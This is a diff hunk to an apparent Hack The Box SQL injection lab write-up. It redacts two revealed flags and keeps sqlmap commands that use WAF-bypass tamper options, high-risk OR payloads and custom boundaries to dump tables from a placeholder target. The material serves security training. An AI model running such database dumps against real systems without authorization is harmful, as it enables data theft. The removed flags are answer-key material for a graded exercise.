@@ -2173,14 +2173,14 @@ sqlmap -u "URL" --chunked --random-agent --tamper=modsecurityversioned
 ```bash
 # Requires OR payloads (risk level 3)
 sqlmap -u "http://target/case5.php?id=1" --risk=3 --batch --dump
-# Result: HTB{700_much_r15k_bu7_w0r7h_17}
+# Result: HTB{...}
 ```
 
 **Case #6 (Custom Boundaries):**
 ```bash
 # Non-standard injection boundaries  
 sqlmap -u 'http://target/case6.php?col=id' --prefix='`)' --batch -T flag6 --dump
-# Result: HTB{v1nc3_mcm4h0n_15_4570n15h3d}
+# Result: HTB{...}
 ```
 
 **Case #7 (Advanced Tuning):**
